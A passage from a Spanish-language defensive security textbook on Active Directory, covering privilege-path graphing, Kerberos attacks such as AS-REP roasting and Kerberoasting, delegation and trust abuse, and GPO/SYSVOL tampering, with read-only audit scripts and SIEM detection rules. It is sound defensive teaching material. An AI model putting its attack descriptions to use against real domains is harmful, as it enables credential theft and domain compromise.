net = Network(height='1000px', width='100%', directed=True, notebook=False)
net.force_atlas_2based()

# Visual styling by node type / privileged
for n, data in G.nodes(data=True):
    label = data.get('label', n)
    ntype = data.get('type','unknown')
    privileged = data.get('privileged', False)
    title = f"{label}<br>Type: {ntype}<br>Privileged: {privileged}"
    color = 'red' if privileged else ('orange' if ntype=='group' else 'lightblue')
    size = 25 if privileged else (18 if ntype=='group' else 12)
    net.add_node(n, label=label, title=title, color=color, size=size)

# Add edges with tooltips
for u, v, data in G.edges(data=True):
    rel = data.get('rel','rel')
    w = data.get('weight',1.0)
    net.add_edge(u, v, title=f"{rel} (w={w})", value=w)

# Add legend (simple)
net.add_node("LEGEND_PRIV", label="Privileged account", color="red", size=20, x=-800, y=-400, fixed=True)
net.add_node("LEGEND_GROUP", label="Group", color="orange", size=16, x=-800, y=-350, fixed=True)
net.add_node("LEGEND_USER", label="User/Computer", color="lightblue", size=12, x=-800, y=-300, fixed=True)

net.show_buttons(filter_=['physics'])
net.show(out_html)
print("Visualization written to", out_html)
```

**Qué hace el script (defensivo):**

* Representa el grafo AD como directed graph.
* Resalta nodos “privileged” para facilitar priorización.
* Genera un HTML interactivo que analistas y arquitectos pueden usar para revisar caminos a privilegios.

**Recomendación:** mantén el HTML y los CSVs bajo control de acceso (no publiques en servidores públicos).

---

## 7. Integración con flujos de trabajo de remediación

Una vez visualices rutas críticas:

1. Extrae shortest paths hacia grupos privilegiados y genera tickets (JIRA/Ticketing) con acciones: remove membership, review ACL, convert to service account, rotate password.
2. Asigna riesgo (High/Medium/Low) y subtareas: validar owner, validate necessity, test removal in staging.
3. Ejecuta pruebas de regresión (re-export dataset tras cambios) y re-visualiza para confirmar mitigación.

---

## 8. Ejercicios de laboratorio (seguro)

* **Dataset sintético:** crea nodes/edges simulados que contengan un par de rutas a “Domain Admins”. Ejecuta el `ad_graph_visualizer.py` y practica priorización y corrección.
* **Change detection:** usa dos snapshots (antes/después) y calcula diferencias en aristas; verifica que las remediaciones eliminaron caminos peligrosos.
* **Score tuning:** implementa un “weak link score” que combine edad de contraseña, lastLogon y membresías, y ordena remediaciones por score.

---

## 9. Detección y monitoreo (qué alertas crear)

* Alerta si **nuevo** `memberOf` hacia grupos privilegiados.
* Alerta si una cuenta con `hasSPN` y `pwdLastSet` antiguo aparece en rutas cortas a permisos elevados.
* Correlación: cambio en ACLs sobre OU crítica + creación de servicio nuevo → alta prioridad.
* Automatizar export incremental (solo metadatos) para alimentar el grafo cada N horas y detectar drift.

---

## 10. Checklist defensivo (resumen)

* [ ] Solo usar herramientas de enumeración con **autorización escrita**.
* [ ] Generar datasets saneados y versionados antes de visualización.
* [ ] Restringir acceso a visualizaciones/redes de datos.
* [ ] Priorizar rutas cortas a privilegios: aplicar mitigación primero ahí.
* [ ] Automatizar re-evaluaciones tras cada cambio de AD.
* [ ] Mantener playbooks de mitigación y prueba de regresión.

---

## Recursos y lecturas recomendadas (defensa)

* Documentación oficial de Active Directory y ACLs.
* Whitepapers sobre modelado de privilegios (conceptos de graph theory aplicados a AD).
* Plantillas de visualización y ejemplos de uso defensivo de grafos (NetworkX, pyvis).
* Guías de hardening AD: delegación segura, constrained delegation, LAPS, Kerberos policies.

---

# Capítulo 33 — Kerberos: conceptos y defensa (AS-REP, Kerberoast, tickets)

**Objetivos**

* Entender los conceptos centrales del protocolo Kerberos y cómo se integra con Active Directory.
* Explicar, de forma no operativa, qué significan ataques como AS-REP roast, Kerberoasting y el abuso de tickets y por qué son riesgos graves.
* Mostrar cómo detectar señales de abuso en logs y telemetría.
* Presentar medidas de mitigación y hardening para reducir el riesgo.
* Proveer scripts defensivos (solo lectura) para auditar configuraciones y generar alertas.

> **Aviso legal y ético:** todo el contenido y código aquí es para uso defensivo, auditoría y formación en entornos en los que tienes permiso explícito. No uses esta información para intentar explotar, forzar o manipular sistemas ajenos.

---

## 1. Breve repaso técnico de Kerberos (conceptos esenciales)

* **KDC (Key Distribution Center)**: componente del Domain Controller que emite tickets Kerberos.
* **TGT (Ticket Granting Ticket)**: ticket inicial que el cliente obtiene tras autenticarse (AS exchange). Permite pedir TGS.
* **TGS (Ticket Granting Service / Service Ticket)**: ticket que se usa para acceder a un servicio específico (p.ej. HTTP, MSSQL).
* **SPN (Service Principal Name)**: identificador que liga una cuenta a un servicio (ej.: `MSSQLSvc/sql01.corp.local:1433`). Las cuentas que tienen SPNs suelen ser cuentas de servicio.
* **Pre-authentication:** paso donde el KDC valida que el solicitante conoce su secreto antes de emitir TGT. Si una cuenta está marcada como “do not require preauthentication”, puede emitir un AS-REP sin preauth — esto es lo que aprovecha AS-REP roast.
* **Tickets forjados (golden/silver tickets):** ataques que involucran manipulación/crackeo de claves maestra o generación de tickets inválidos; representan compromisos muy graves (dominio).

---

## 2. Qué son esos ataques — explicación conceptual (no operacional)

* **AS-REP roast (concepto):** si una cuenta está configurada para *no requerir preautenticación*, un atacante puede solicitar un AS (AS-REQ) y obtener una respuesta (AS-REP) cifrada con la contraseña de la cuenta. Esa respuesta puede atacarse offline para intentar recuperar la contraseña (ataque por fuerza/brute-force o cracking). Defensa: evitar cuentas con la bandera “do not require preauthentication” y usar contraseñas fuertes.
* **Kerberoasting (concepto):** consiste en solicitar service tickets (TGS) para SPNs pertenecientes a cuentas de servicio; esos tickets están cifrados con la clave derivada de la contraseña de la cuenta de servicio y pueden extraerse y atacarse offline. Defensa: use cuentas de servicio con contraseñas robustas, managed service accounts (gMSA) cuando sea posible y monitoree solicitudes inusuales de TGS.
* **Golden / Silver tickets (concepto):** técnicas de forjado o reutilización de tickets Kerberos. Suponiendo que un adversario obtiene claves de dominio o de servicio, puede crear tickets que el KDC o los servicios acepten. Defensa: proteger las cuentas que almacenan secretos críticos (KRBTGT), monitorizar anomalías en uso de tickets y rotar/mitigar claves comprometidas en caso de sospecha.

---

## 3. Señales y eventos que hay que monitorizar (telemetría)

A continuación, eventos Windows útiles para correlación y detección:

* **Event ID 4768 — Kerberos Authentication (AS-REQ):** AS request (TGT request).

  * Señal: petición AS para cuentas que no hacen preauth o peticiones masivas desde una IP inesperada.
* **Event ID 4769 — Kerberos Service Ticket (TGS-REQ):** solicitud de ticket de servicio (TGS).

  * Señal: picos de solicitudes TGS para una SPN concreta o muchas solicitudes TGS por parte de una cuenta no habitual.
* **Event ID 4771 — Kerberos pre-auth failed** (o 4776/4625 depending on config): indica fallos de autenticación. Rachas de fallos pueden mostrar brute force.
* **Event ID 4624 — Logon success:** correlacionar con tipo de logon y cuentas privilegiadas.
* **Event ID 4672 — Special privileges assigned (e.g. admin logon).**

**Heurísticas de alto nivel (para alertas):**

* Un host o cuenta que solicita TGS para decenas de SPNs en poco tiempo.
* Solicitudes AS para cuentas marcadas “do not require preauth” desde IPs no habituales.
* Múltiples respuestas 4769 con largos tickets que luego no son usados para una conexión real.
* Solicitudes de TGS por una cuenta que no suele acceder a esos servicios (p. ej. una estación de trabajo que pide tickets de administración).

---

## 4. Detección: reglas y consultas (ejemplos defensivos)

Las siguientes son ideas de detección que puedes traducir a reglas en tu SIEM; no son PoC de explotación.

### Regla A — AS-REP roast sospechoso

* Condición: Event 4768 (AS-REQ) para cuentas que tienen el atributo *Do not require Kerberos pre-authentication* habilitado, desde hosts fuera de la normalidad o con tasa elevada en ventana corta.
* Acción: alertar y marcar la cuenta para revisión; forzar cambio de contraseña y revisar logs.

### Regla B — Kerberoasting sospechoso

* Condición: aumentos inusuales en Event 4769 (TGS-REQ) para un SPN concreto o muchas solicitudes TGS originadas por un único host/cuenta dentro de 5–15 minutos.
* Acción: alertar, investigar fuente de solicitudes y bloquear/restringir si procede.

### Regla C — Uso anómalo de tickets

* Condición: ticket TGS emitido (4769) pero sin asociación posterior a una sesión de servicio legítima (4624) o usados desde IPs/sources no habituales.
* Acción: correlacionar y escalar.

---

## 5. Controles y mitigaciones (hardening)

1. **Evitar cuentas con “Do not require Kerberos pre-authentication”** salvo casos justificados y documentados.
2. **Usar managed service accounts (gMSA)** para servicios cuando sea posible; gMSA manejan contraseñas automáticamente y reducen riesgo de contraseñas débiles en cuentas de servicio.
3. **SPN hygiene:** inventario y control de SPNs, evitar SPNs en cuentas con passwords no rotadas o no administradas.
4. **Políticas de contraseñas fuertes y rotación para cuentas de servicio.**
5. **Aplicar el principio de mínimo privilegio**: restringir quién puede *request* tickets para servicios sensibles y controlar delegación.
6. **Habilitar y exigir LDAPS y Kerberos signing** donde aplique; proteger canales de control.
7. **Protección de KRBTGT:** rotación planificada de la cuenta `krbtgt` si hay sospecha de compromiso (procedimiento delicado, requiere coordinación).
8. **Credential Guard / LSA protection**: habilitar protecciones que evitan el volcado fácil de secretos desde memoria.
9. **Segmentación y control de acceso a servicios sensibles** (administrative hosts vs user workstations).
10. **Registrar y retener logs Kerberos y correlarlos** con eventos de proceso, red y cambios de ACL.

---

## 6. Scripts defensivos y consultas (solo lectura)

A continuación ejemplos de scripts **defensivos** (PowerShell / Python) que sirven para auditar la configuración y detectar señales. Todos son **solo lectura** y pensados para administradores.

### 6.1 PowerShell — listar cuentas con “Do not require Kerberos pre-authentication”

```powershell
# lista_preauth_disabled.ps1
# Uso: ejecutar con privilegios de lectura en AD (cuenta con permisos de auditoría)
Import-Module ActiveDirectory

$filter = "userAccountControl:1.2.840.113556.1.4.803:=4194304"
# Note: el filtro busca el bit DONT_REQUIRE_PREAUTH. Ajusta según tu entorno.
Get-ADUser -LDAPFilter $filter -Properties SamAccountName, userAccountControl |
    Select-Object SamAccountName, @{n='PreAuthDisabled';e={$true}}
```

**Explicación:** identifica usuarios configurados sin pre-auth; las cuentas encontradas deben revisarse, justificar y cambiar contraseña o habilitar preauth.

### 6.2 PowerShell — inventario de SPNs y cuentas de servicio

```powershell
# list_spns.ps1
Import-Module ActiveDirectory
# Buscar cuentas con SPN definido
Get-ADUser -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName,sAMAccountName |
    Select-Object sAMAccountName, servicePrincipalName |
    Export-Csv spn_inventory.csv -NoTypeInformation
```

Usa el CSV para revisar qué cuentas tienen SPNs y priorizar las que tienen passwords no rotadas o sin gMSA.

### 6.3 PowerShell — detectar picos de solicitudes TGS (analizar eventos)

```powershell
# detect_tgs_spike.ps1
# Requiere acceso a los eventos de Security del DC (lectura)
$since = (Get-Date).AddMinutes(-15)
# 4769 = TGS-REQ
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769; StartTime=$since} -ErrorAction SilentlyContinue
# Agrupar por TargetServiceName (SPN) o by Account
$grouped = $events | Group-Object -Property @{Expression={$_.Properties[0].Value}} # ajustar índice al field correcto
$grouped | Where-Object {$_.Count -gt 20} | Select-Object Name, Count
```

Ajusta el índice de `Properties[...]` según la plantilla de eventos de tu versión/idioma; la idea es detectar SPNs con más de N solicitudes en ventana corta.

### 6.4 Python — analizar export CSV de eventos 4769 para picos

```python
# analyze_4769.py
import csv, collections, sys
from datetime import datetime, timedelta

if len(sys.argv) < 2:
    print("Usage: python3 analyze_4769.py events4769.csv")
    sys.exit(1)

events = []
with open(sys.argv[1], newline='', encoding='utf-8') as fh:
    reader = csv.DictReader(fh)
    for r in reader:
        # asuma campos: TimeCreated, TargetServiceName, AccountName, IpAddress
        t = datetime.fromisoformat(r['TimeCreated'])
        events.append((t, r['TargetServiceName'], r['AccountName'], r.get('IpAddress','')))

# sliding window: cuenta solicitudes por SPN en últimos 15 minutos
window = timedelta(minutes=15)
events.sort()
by_spn = collections.defaultdict(list)
for t, spn, acc, ip in events:
    by_spn[spn].append(t)

for spn, times in by_spn.items():
    # conteo en ventana
    counts = 0
    for i in range(len(times)):
        j = i
        while j < len(times) and times[j] - times[i] <= window:
            j += 1
        count = j - i
        if count > 30:  # umbral ajustable
            print(f"Spike detected SPN={spn} count={count} window starting {times[i]}")
            break
```

Este script asume que has exportado eventos desde tu SIEM/DC a CSV; te ayuda a detectar picos por SPN.

---

## 7. Respuesta y playbook (si detectas anomalías)

1. **Aislar y mitigar**: si hay evidencia concreta de intento de AS-REP roast o Kerberoast desde una fuente, bloquea/aisla la IP, o impide temporalmente solicitudes si tu infraestructura lo permite.
2. **Revisar cuentas objetivo**: identifica la cuenta de servicio o usuario implicado y fuerza rotación de contraseña; si es una gMSA, sigue procedimiento gestionado.
3. **Forense y telemetría**: recolecta eventos 4768/4769/4624/4672, pcap si procede, y snapshots de DC si es necesario (coordinado con legal).
4. **Remediación**: habilitar pre-auth en cuentas que no lo tengan; rotar contraseñas; revisar delegaciones y SPNs; evaluar si hay evidencia de ticket forging → en ese caso, plan de rotación de krbtgt y acciones coordinadas.
5. **Comunicación**: notificar stakeholders, actualizar playbooks y reglas SIEM basadas en la lección.

---

## 8. Ejercicios de laboratorio seguros (blue team training)

* **Ejercicio A — Simular picos de TGS en entorno aislado:** en un laboratorio cerrado, generar cargas de TGS (con cuentas de prueba) y validar que las reglas de detección disparan. Todo dentro de una red controlada.
* **Ejercicio B — Auditar cuentas sin pre-auth:** ejecutar `lista_preauth_disabled.ps1` en un entorno de pruebas y corregir la configuración de esas cuentas; verificar que las alertas desaparecen.
* **Ejercicio C — Inventario SPN y priorización:** exportar `spn_inventory.csv`, seleccionar las cuentas con mayor riesgo (contraseña antigua, no gMSA) y aplicar política de rotación.

Estos ejercicios permiten entrenar respuesta y detección sin enseñar cómo explotar Kerberos.

---

## 9. Checklist de mitigación rápido

* [ ] Revisar y eliminar cuentas con DONT_REQUIRE_PREAUTH innecesarias.
* [ ] Usar gMSA para cuentas de servicio cuando sea posible.
* [ ] Inventario de SPNs y rotación programada de contraseñas de cuentas de servicio.
* [ ] Reglas SIEM para eventos 4768/4769/4771 que detecten picos y patrones anómalos.
* [ ] Habilitar LSA Protection / Credential Guard donde aplique.
* [ ] Plan de respuesta para rotación de `krbtgt` en caso de compromiso confirmado.
* [ ] Mantener retención suficiente de logs de Kerberos para investigación forense.

---

## 10. Recursos y lecturas (defensa)

* Documentación Microsoft sobre Kerberos, eventos de seguridad y configuración de pre-auth.
* Guías de hardening AD (LAPS, constrained delegation, gMSA).
* Publicaciones de incident response sobre detección de Kerberos abuse y procedimientos de rotación de `krbtgt`.
* Whitepapers sobre implementación de Credential Guard y LSA hardening.

---

# Capítulo 34 — Abuso de delegación y trusts (defensa, auditoría y mitigación)

---

## Objetivos

* Entender cómo funciona la **delegación** y qué tipos existen (unconstrained, constrained, resource-based).
* Comprender los **trusts** entre dominios y bosques.
* Detectar configuraciones peligrosas que permitan abuso o pivoteo lateral.
* Implementar scripts de **auditoría defensiva** para identificar riesgos.
* Aplicar un **playbook de respuesta** ante detección de trust o delegación insegura.

> **Aviso ético:** todo lo descrito en este capítulo está orientado a defensa y detección. Ningún procedimiento ofensivo ni de pivoteo está incluido. Toda auditoría de trusts o delegaciones debe realizarse con autorización del propietario del dominio.

---

## 1. Delegación en Active Directory: conceptos fundamentales

### a) Qué es la delegación

La delegación permite que un servicio actúe en nombre de un usuario ante otros servicios. Ejemplo: un servidor web autenticado ante un SQL Server usando las credenciales del usuario.
Esto mejora la funcionalidad pero puede ser riesgoso si no se configura correctamente.

### b) Tipos de delegación

| Tipo                                             | Descripción                                                                            | Riesgo                                                                                     | Mitigación                                                   |
| ------------------------------------------------ | -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------ |
| **Unconstrained delegation**                     | El servicio puede usar el ticket TGT del usuario ante cualquier otro servicio.         | Altísimo: si se compromete el servicio, puede usarse para autenticarse en todo el dominio. | Evitar usarla; migrar a constrained o resource-based.        |
| **Constrained delegation (KCD)**                 | Permite delegar solo a servicios específicos definidos por `msDS-AllowedToDelegateTo`. | Riesgo moderado; depende de la lista de servicios permitidos.                              | Revisar periódicamente el atributo.                          |
| **Resource-based constrained delegation (RBCD)** | Definida en el recurso destino (`msDS-AllowedToActOnBehalfOfOtherIdentity`).           | Riesgo si se abusa de permisos de escritura sobre el recurso.                              | Controlar ACLs y grupos con escritura sobre objetos destino. |

---

## 2. Trusts: relaciones entre dominios y bosques

Un **trust** (relación de confianza) permite que un dominio autorice usuarios de otro dominio o bosque.

| Tipo de trust              | Descripción                                      | Riesgo                                                |
| -------------------------- | ------------------------------------------------ | ----------------------------------------------------- |
| **Parent-child**           | Entre dominios dentro del mismo bosque.          | Bajo; gestionado internamente.                        |
| **Forest**                 | Entre bosques diferentes.                        | Moderado; puede ser bidireccional.                    |
| **External**               | Entre dominios sin pertenecer al mismo bosque.   | Alto; puede introducir credenciales externas.         |
| **Shortcut**               | Optimiza autenticación entre dominios distantes. | Medio; revisar configuración.                         |
| **Selective / transitive** | Determina si la confianza se hereda.             | Si es transitive, puede ampliar superficie de ataque. |

**Flujo de autenticación:** los DC intercambian tickets Kerberos para permitir logons interdominio. Si se manipula o configura mal, puede habilitar accesos no deseados.

---

## 3. Riesgos comunes de abuso (a detectar, no ejecutar)

1. **Servicios con unconstrained delegation.**

   * Si el servidor se compromete, el atacante puede usar tickets TGT cacheados.
   * Detectable revisando atributo `userAccountControl` con bit `TRUSTED_FOR_DELEGATION`.

2. **Cuentas con constrained delegation a muchos servicios.**

   * Riesgo si el servicio tiene permisos excesivos (`msDS-AllowedToDelegateTo`).

3. **ACLs débiles en objetos con RBCD.**

   * Si un usuario tiene `WriteDacl` o `WriteProperty` sobre `msDS-AllowedToActOnBehalfOfOtherIdentity`, puede permitir que otro objeto actúe en nombre de usuarios.

4. **Trusts bidireccionales o externos mal configurados.**

   * Un dominio externo comprometido puede usar la confianza para autenticarse en el dominio interno.

---

## 4. Auditoría ética: PowerShell y scripts defensivos

### a) Revisar objetos con unconstrained delegation

```powershell
# unconstrained_audit.ps1
Import-Module ActiveDirectory
Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties name,servicePrincipalName |
Select-Object name, servicePrincipalName |
Export-Csv unconstrained_objects.csv -NoTypeInformation
```

**Qué hace:** busca objetos con el bit `TRUSTED_FOR_DELEGATION` activo (524288).
**Acción:** revisar los resultados; migrar estos servicios a constrained o RBCD.

---

### b) Revisar cuentas con constrained delegation

```powershell
# constrained_audit.ps1
Import-Module ActiveDirectory
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo |
Select-Object SamAccountName, msDS-AllowedToDelegateTo |
Export-Csv constrained_delegation.csv -NoTypeInformation
```

**Uso:** exporta lista de cuentas que pueden delegar a servicios específicos.
**Acción:** validar que los servicios listados son legítimos y esperados.

---

### c) Revisar RBCD (resource-based)

```powershell
# rbcd_audit.ps1
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' |
Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' } |
Select-Object Name,@{n='RBCD';e={$_. 'msDS-AllowedToActOnBehalfOfOtherIdentity'}} |
Export-Csv rbcd_entries.csv -NoTypeInformation
```

**Acción:** analizar las ACLs asociadas a estos objetos; solo servicios autorizados deben tener esta propiedad.

---

### d) Enumerar trusts configurados

```powershell
# trusts_audit.ps1
Import-Module ActiveDirectory
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, IsTransitive, ForestTransitive, TrustAttributes |
Export-Csv domain_trusts.csv -NoTypeInformation
```

**Acción:** revisar direcciones bidireccionales y trusts externos. Confirmar necesidad y políticas de autenticación cruzada.

---

## 5. Indicadores de abuso o mal uso

* Cambios recientes en `msDS-AllowedToDelegateTo` o `msDS-AllowedToActOnBehalfOfOtherIdentity`.
* Creación de objetos con privilegios de delegación inesperados.
* Nuevas relaciones de trust detectadas en `Get-ADTrust`.
* Autenticaciones interdominio inusuales (event IDs 4769, 4624 tipo 3 con logon GUID externo).
* Modificaciones de ACLs en objetos críticos sin aprobación.

---

## 6. Playbook de respuesta defensiva

| Etapa                    | Acción                                                                                                               | Herramienta                  |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------- | ---------------------------- |
| **Detección**            | Revisión de logs (Directory Service y Security). Buscar cambios en `msDS-*` y `Get-ADObject -IncludeDeletedObjects`. | SIEM / PowerShell            |
| **Contención**           | Aislar cuentas o equipos con delegación insegura. Deshabilitar temporalmente trust sospechoso.                       | AD Admin Center / PowerShell |
| **Análisis**             | Revisar ACLs de los objetos involucrados, correlacionar con logs 5136 (modificación de objeto).                      | AD Audit / Event Viewer      |
| **Remediación**          | Eliminar o limitar delegaciones no necesarias. Cambiar contraseñas de servicios afectados.                           | GPO / AD Tools               |
| **Recuperación**         | Verificar autenticaciones y replicación del dominio. Restaurar políticas seguras.                                    | Repadmin / LDP               |
| **Lecciones aprendidas** | Actualizar procesos de aprobación de trusts y delegaciones. Documentar excepciones.                                  | SOC Procedures               |

---

## 7. Ejercicio de laboratorio ético

1. **Configura dos dominios de laboratorio** (e.g. `lab.local` y `dev.local`) en máquinas virtuales.
2. Crea relaciones de trust *selectivas* y observa cómo los eventos de autenticación se registran (4769, 4624).
3. Ejecuta los scripts `trusts_audit.ps1` y `rbcd_audit.ps1` para generar reportes.
4. Deshabilita temporalmente un trust y analiza cómo cambia la autenticación entre dominios.
5. Documenta los resultados y genera un checklist de remediación.

Estos pasos no implican pivoteo ni abuso, solo observación y configuración segura.

---

## 8. Checklist de mitigación

* [ ] Evitar **unconstrained delegation** en servidores.
* [ ] Revisar cuentas con **constrained delegation** (validar destinos).
* [ ] Auditar propiedades **RBCD** regularmente.
* [ ] Revisar trusts (dirección, tipo, transitivity).
* [ ] Segmentar dominios con firewalls y políticas de autenticación.
* [ ] Configurar alertas SIEM para cambios en atributos `msDS-*`.
* [ ] Aplicar principio de privilegio mínimo en cuentas de servicio.
* [ ] Mantener inventario actualizado de delegaciones y trusts.

---

## 9. Recursos recomendados

* **Microsoft: “Securing delegation in Active Directory”** (TechNet).
* **CIS Benchmarks for AD Security.**
* **BloodHound (uso defensivo):** visualización de delegaciones y rutas de privilegio.
* **PingCastle:** auditoría de trusts y configuraciones.
* **SANS DFIR: AD audit and delegation misconfigurations.**

---

## Conclusión

La delegación y los trusts son mecanismos legítimos pero altamente sensibles. Si se configuran sin control, abren puertas para movimientos laterales o escaladas. El Red Team ético y el Blue Team deben colaborar en su auditoría continua: un control riguroso de `msDS-AllowedToDelegateTo`, `msDS-AllowedToActOnBehalfOfOtherIdentity` y las relaciones de trust es clave para mantener la seguridad de un dominio y prevenir ataques interdominio.

---

# Capítulo 35 — Ataques a GPO y control de políticas

**Modificar startup/shutdown scripts y políticas (enfoque: auditoría, detección y mitigación — sin instrucciones ofensivas)**

**Objetivos**

* Explicar por qué las GPO (Group Policy Objects) y los scripts de inicio/apagado son vectores sensibles.
* Enseñar cómo auditar y detectar cambios sospechosos en GPO o en scripts de inicio (SYSVOL).
* Proveer herramientas y **scripts defensivos (solo lectura)** en PowerShell y Python para exportar, analizar y alertar sobre cambios en GPO/startup scripts.
* Presentar playbooks de respuesta y un checklist operativo para administración segura de políticas.

> **Aviso ético-legal (obligatorio):** toda interacción con GPO y SYSVOL **requiere** autorización. Los ejemplos y scripts de este capítulo son **solo para auditoría/defensa** y **no** incluyen procedimientos para modificar políticas o desplegar scripts maliciosos. No utilices este material para actividades no autorizadas.

---

## 1. Resumen: por qué GPO y scripts de inicio son críticos

* Las GPO controlan configuraciones de seguridad, ejecución de scripts (startup/shutdown, logon/logoff), redirecciones, instalación de software, etc.
* Los scripts almacenados en `SYSVOL` o referenciados por GPO son ejecutados con privilegios (p. ej. `Computer` startup scripts ejecutan como SYSTEM).
* Si un actor malicioso consigue modificar un GPO o sustituir un script en SYSVOL, puede lograr ejecución con altos privilegios en múltiples hosts.
* Por eso la protección, el monitoreo y la auditoría de cambios en GPO/SYSVOL es crítica.

---

## 2. Vectores de riesgo (conceptual — para detectar)

* Modificación directa de archivos en `\\<domain>\SYSVOL\<domain>\Policies\{GPO-GUID}\Machine\Scripts\Startup\` o `User\Scripts\Logon\`.
* Cambios en atributos del GPO (delegaciones, permisos, filtros WMI, security filtering).
* GPO con Startup scripts que referencian ubicaciones de red o binarios no firmados.
* GPOs recientemente creadas o editadas fuera de ventanas de mantenimiento.
* Permisos ACL en SYSVOL que permiten escritura a cuentas no administrativas.

---

## 3. Herramientas y telemetría a utilizar (lista defensiva)

* **PowerShell (GroupPolicy module)**: `Get-GPO`, `Get-GPOReport`, `Get-GPResultantSetOfPolicy`.
* **SYSVOL inspection**: lecturas de `\\domain\SYSVOL\...` y verificación de hashes/cronología.
* **Windows Event Logs**: Auditar `Directory Service Changes` (Event IDs 5136, 5137, 5138, 5139) y `File System` audit sobre SYSVOL.
* **SIEM**: correlación entre cambios GPO y creación/modificación de archivos en SYSVOL; alertas por ediciones fuera de horario.
* **FS auditing**: activar auditoría de accesos a SYSVOL (audit file system) y retener logs.
* **ACL review tools**: `Get-Acl`, `icacls`, y soluciones EPM/EDR que alerten sobre cambios de permisos.

---

## 4. Auditoría defensiva — flujo recomendado

1. Exportar GPOs a reportes XML/HTML periódicamente (`Get-GPOReport`).
2. Indexar y parsear los reportes para extraer referencias a scripts y cambios de configuración.
3. Verificar integridad de scripts en SYSVOL: hashes, timestamps y permisos.
4. Correlacionar cambios con eventos 5136 (AD object modified) y eventos de archivo en SYSVOL.
5. Alertar si: GPOs con startup scripts nuevos, scripts modificados, escritos por cuentas no autorizadas o fuera de ventanas de mantenimiento.
6. Mantener copia de referencia (golden copy) de scripts autorizados y comparar.

---

## 5. Scripts defensivos (solo lectura)

### 5.1 PowerShell — exportar todos los GPOs a XML (lectura)

Este comando/export es de lectura y seguro: crea reportes que luego analizaremos.

```powershell
<#
Export-GPOReports.ps1
- Exporta reportes XML de todas las GPOs para auditoría
- Uso: ejecutar con una cuenta que tenga permisos de lectura de GPOs (ej. domain read)
#>

Import-Module GroupPolicy

$outDir = "C:\GPO_Audit_Reports"
New-Item -Path $outDir -ItemType Directory -Force | Out-Null

$gpos = Get-GPO -All
foreach ($g in $gpos) {
    $path = Join-Path $outDir ($g.Id.ToString() + ".xml")
    Get-GPOReport -Guid $g.Id -ReportType Xml -Path $path
    Write-Host "Exportado $($g.DisplayName) -> $path"
}
Write-Host "Export completed. Reports in $outDir"
```

**Qué hace:** exporta la configuración de cada GPO en formato XML para análisis fuera-línea; **no modifica** nada.

---

### 5.2 PowerShell — listar scripts de Startup/Shutdown/Logon/Logoff desde reports

Este script lee los XML exportados y extrae rutas y nombres de scripts.

```powershell
<#
Parse-GPOStartupScripts.ps1
- Parsea los XML exportados por Get-GPOReport y lista scripts referenciados
- Uso: colocar XMLs en carpeta y ejecutar
#>

$reportsDir = "C:\GPO_Audit_Reports"
$xmlFiles = Get-ChildItem -Path $reportsDir -Filter *.xml

$result = @()
foreach ($f in $xmlFiles) {
    [xml]$doc = Get-Content $f.FullName
    $gpoName = $doc.GPO.DisplayName
    # XPath para Scripts: verificamos Machine/Computer and User scripts nodes
    $scriptNodes = $doc.SelectNodes("//Scripts/*/*")
    foreach ($s in $scriptNodes) {
        $type = $s.ParentNode.ParentNode.Name  # e.g. Machine, User
        $scriptName = $s.ScriptName
        $scriptParams = $s.ScriptParameters
        $result += [PSCustomObject]@{
            GPO = $gpoName
            ScriptType = $type
            ScriptName = $scriptName
            Parameters = $scriptParams
            ReportFile = $f.Name
        }
    }
}

$result | Format-Table -AutoSize
$result | Export-Csv "gpo_startup_scripts_inventory.csv" -NoTypeInformation
Write-Host "Inventory written to gpo_startup_scripts_inventory.csv"
```

**Salida:** CSV con GPO, tipo (Machine/User), nombre de script y parámetros. Con ese inventario podemos chequear SYSVOL.

---

### 5.3 PowerShell — verificar integridad de scripts en SYSVOL (hashes & permisos)

Este script recorre las rutas encontradas (suponiendo que los scripts están en `\\<domain>\SYSVOL\...`) y calcula SHA256 y obtiene ACLs (lectura solamente).

```powershell
<#
Check-SysvolScriptsIntegrity.ps1
- Lectura de scripts listados y cálculo de hash + permisos
- Entrada: CSV generado por Parse-GPOStartupScripts.ps1
#>

$inventory = Import-Csv "gpo_startup_scripts_inventory.csv"
$out = @()

foreach ($row in $inventory) {
    # asume que ScriptName es relativo dentro de la carpeta de scripts del GPO o apunta a UNC
    $scriptRelative = $row.ScriptName
    # intenta localizar script en SYSVOL (simplificado)
    $sysvolPath = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies\*"  # simplificación; ideal mapear GUIDs
    $found = Get-ChildItem -Path $sysvolPath -Recurse -Filter $scriptRelative -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) {
        $hash = Get-FileHash -Path $found.FullName -Algorithm SHA256
        $acl = (Get-Acl -Path $found.FullName).Access | Out-String
        $out += [PSCustomObject]@{
            GPO = $row.GPO
            Script = $found.FullName
            Hash = $hash.Hash
            ACL = $acl
            LastWriteTime = $found.LastWriteTime
        }
    } else {
        $out += [PSCustomObject]@{
            GPO = $row.GPO
            Script = $scriptRelative
            Hash = "NOT FOUND"
            ACL = "NOT FOUND"
            LastWriteTime = ""
        }
    }
}

$out | Export-Csv "sysvol_scripts_integrity.csv" -NoTypeInformation
Write-Host "Integrity report: sysvol_scripts_integrity.csv"
```

**Notas defensivas:** el script busca archivos; no los modifica. Para entornos grandes, adapta rutas a GUID del GPO y usa paginación.

---

### 5.4 Python — parsear reports y detectar cambios (diff entre snapshots)

Este script compara dos carpetas de reportes XML (por ejemplo, `snapshot_2025-11-01` y `snapshot_2025-12-01`) y lista GPOs con diferencias en las secciones de Scripts.

```python
#!/usr/bin/env python3
"""
gpo_diff_scripts.py
- Compara dos snapshots de GPO XML exportados y reporta cambios en script references.
"""
import os, sys, xml.etree.ElementTree as ET
from collections import defaultdict

def extract_scripts(xml_path):
    tree = ET.parse(xml_path)
    root = tree.getroot()
    scripts = set()
    for script in root.findall(".//Script"):
